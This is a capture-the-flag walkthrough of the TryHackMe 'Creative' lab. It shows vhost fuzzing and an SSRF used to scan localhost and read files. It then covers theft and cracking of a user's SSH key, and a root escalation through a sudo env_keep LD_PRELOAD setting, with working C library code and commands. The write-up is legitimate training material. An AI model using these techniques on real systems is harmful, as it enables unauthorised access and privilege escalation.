---
title: 'TryHackMe: Creative'
author: jaxafed
categories: [TryHackMe]
tags: [web, ffuf, fuzzing, vhost, ssrf, ssh, john, sudo, ld_preload]
render_with_liquid: false
media_subpath: /images/tryhackme_creative/
image:
  path: room_image.webp
---

Creative was a simple and straight-forward room. First, we discover a virtual host with an SSRF vulnerability and use it to scan for internal web servers. Upon discovering an internal web server running on port 1337 that allows us to read files from the server, we use it to read the private SSH key of a user. Cracking the passphrase for the key using john, we get a shell via SSH. After discovering the password for the user in the bash history, we abused the env_keep option for the LD_PRELOAD environment variable in sudo configuration to escalate to the root user.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/creative){: .center }

## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.24.245
Nmap scan report for 10.10.24.245
Host is up (0.092s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two ports open:

- 22/SSH
- 80/HTTP

Nmap already informs us that port 80 redirects to `creative.thm`, adding it to our hosts file.

```
10.10.24.245 creative.thm
```
{: file="/etc/hosts"}

### Port 80

Visiting `http://creative.thm`, we get a static site with no obvious functionality.

![Web Server Port 80 Index](web_80_index.webp){: width="1200" height="900" }

## Shell as user

### Discovering the VHOST

Fuzzing for the virtual hosts using `ffuf`, we discover `http://beta.creative.thm`.

```console
$ ffuf -u 'http://creative.thm/' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.creative.thm" -mc all -t 100 -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://creative.thm/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response size: 178
________________________________________________

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 128ms]
:: Progress: [19966/19966] :: Job [1/1] :: 449 req/sec :: Duration: [0:01:18] :: Errors: 0 ::
```
{: .wrap }

Adding it to our hosts file.

```
10.10.24.245 creative.thm beta.creative.thm
```
{: file="/etc/hosts"}

Visiting `http://beta.creative.thm/`, we see a form where we can submit URL's for testing.

![Web Server Port 80 Beta Index](web_80_beta_index.webp){: width="1200" height="900" }

Testing it with `http://creative.thm/`, it returns the contents of the URL submitted.

![Web Server Port 80 Beta Creative Test](web_80_beta_creative.webp){: width="1200" height="900" }

And testing it with `http://creative.thm/doesnotexist`, it returns `Dead`.

![Web Server Port 80 Beta Dead Test](web_80_beta_dead.webp){: width="1200" height="900" }

It seems the server returns the contents of the URL if it gets a positive response and `Dead` if it gets a negative one.

Also testing `http://127.0.0.1/`, we get the contents of the page. So, there does not seem to be a filter in place preventing us from accessing services on localhost.

### Discovering the Internal Web Server

We can use this functionality to scan for internal web servers using `ffuf`.

```console
$ ffuf -u 'http://beta.creative.thm/' -d "url=http://127.0.0.1:FUZZ/" -w <(seq 1 65535) -H 'Content-Type: application/x-www-form-urlencoded' -mc all -t 100 -fs 13

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://beta.creative.thm/
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : url=http://127.0.0.1:FUZZ/
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response size: 13
________________________________________________

80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 136ms]
1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 137ms]
```
{: .wrap }

We discover a web server running on localhost port 1337.

Now, with the `http://127.0.0.1:1337/` payload on `http://beta.creative.thm`, we are able to get the contents of the web server.

![Web Server Port 80 Beta Port 1337](web_80_beta_port_1337.webp){: width="1200" height="900" }

It seems like a simple web server with file indexing enabled, running on the root of the filesystem.

This allows us to read files from the server as the user running the web server.

### Reading the SSH Key

Checking the `/home` directory with `http://127.0.0.1:1337/home/`, we see a home folder for a single user: `saad`.

![Web Server Port 80 Beta Port 1337 Home](web_80_beta_port_1337_home.webp){: width="1200" height="900" }

Checking `/home/saad/` with `http://127.0.0.1:1337/home/saad/`, we see the presence of the `.ssh` folder.

![Web Server Port 80 Beta Port 1337 Home Saad](web_80_beta_port_1337_home_saad.webp){: width="1200" height="900" }

Inside the `/home/saad/.ssh/` directory, there is a private ssh key as `id_rsa` which we are able to read.

![Web Server Port 80 Beta Port 1337 SSH Key](web_80_beta_port_1337_ssh_key.webp){: width="1200" height="900" }

### Cracking the Passphrase

After setting the correct permissions for the key and trying to SSH with it, it prompts us for the passphrase.

```console
$ chmod 600 id_rsa  

$ ssh -i id_rsa saad@creative.thm 
Enter passphrase for key 'id_rsa': 
```

We can try to crack the passphrase with `john`.

First, `ssh2john` to convert it to a format `john` can work with.

```console
$ ssh2john id_rsa > id_rsa.hash
```

Now running `john` with `rockyou.txt`, we get the passphrase for the key.

```console
$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]        (id_rsa)     
1g 0:00:02:13 DONE (2024-04-12 22:06) 0.007496g/s 7.196p/s 7.196c/s 7.196C/s whitney..sandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Using the passphrase with the key, we are able to get a shell using SSH and read the user flag.

```console
$ ssh -i id_rsa saad@creative.thm                              
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
...
Last login: Mon Nov  6 07:56:40 2023 from 192.168.8.102
saad@m4lware:~$ wc -c user.txt
33 user.txt
```

## Shell as root

### Discovering the Password

From the `.bash_history` file in the user's home, we find the password for the user.

```console
saad@m4lware:~$ cat .bash_history 
...
echo "saad:[REDACTED]" > creds.txt
...
```

### Abusing LD_PRELOAD

Using the password we have found for checking the `sudo` privileges, we see that we are able to run `/usr/bin/ping` as root.

```console
saad@m4lware:~$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
```

There is not much we can do with `ping` but there is one interesting thing about the `sudo` configuration: the `env_keep` option on `LD_PRELOAD`.

```console
env_keep+=LD_PRELOAD
```

This allows us to set the `LD_PRELOAD` environment variable for the commands we run as `root` with `sudo`.

The `LD_PRELOAD` environment variable is used for specifying libraries to load before any other library for the processes.

We can use this to make the process we run as `root` with `sudo` to load a malicious library and run our code.

First crafting a malicious shared library that will spawn a shell for us.

We place our code inside the `_init()` function, so it gets run when the library is loaded.

Also, unsetting the `LD_PRELOAD` variable after the library is loaded to stop other processes we run from loading the library again and spawning another shell.

```c
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	system("/bin/sh");
}
```
{: file="/tmp/shell.c" }

Compiling it into a shared library.

```console
saad@m4lware:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Now running the `ping` command as root using `sudo` with the `LD_PRELOAD` environment variable pointing to our malicious shared library, we get a shell as root and can read the root flag.

```console
saad@m4lware:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
# id
uid=0(root) gid=0(root) groups=0(root)
# wc -c /root/root.txt
33 /root/root.txt
```


<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>